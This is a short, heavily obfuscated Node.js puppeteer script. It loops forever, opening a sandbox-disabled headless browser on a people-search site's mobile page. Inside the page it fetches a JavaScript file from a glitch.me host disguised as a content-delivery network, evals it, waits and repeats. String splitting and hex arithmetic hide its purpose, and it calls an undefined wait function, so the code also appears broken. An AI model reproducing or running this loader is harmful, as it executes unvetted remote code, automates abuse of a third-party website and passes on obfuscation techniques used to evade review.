((async () => {
  const e = require('puppeteer'),
    f = await e['launch']({
      'headless': 0x1,
      'args': [
        '--no-sandb' + 'ox',
        '--disable-' + 'setuid-san' + 'dbox'
      ]
    });
  (async function g() {
    let h = -0x1a6 * -0xd + -0x24cb + 0xf5d;
    const i = await f['createInco' + 'gnitoBrows' + 'erContext'](),
      j = await i['newPage']();
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      'timeout': 0x11170
    })['catch'](k => h++), h ? (await j['close'](), await i['close'](), g()) : (await j['evaluate'](() => {
      let k = new XMLHttpRequest();
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x3e1 + -0x1 * -0x1107 + -0xd26), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(-0x1829 * 0x21 + 0x678b * -0x43 + 0x2bf24a * 0x1), await j['close'](), await i['close'](), g());
  }());
})());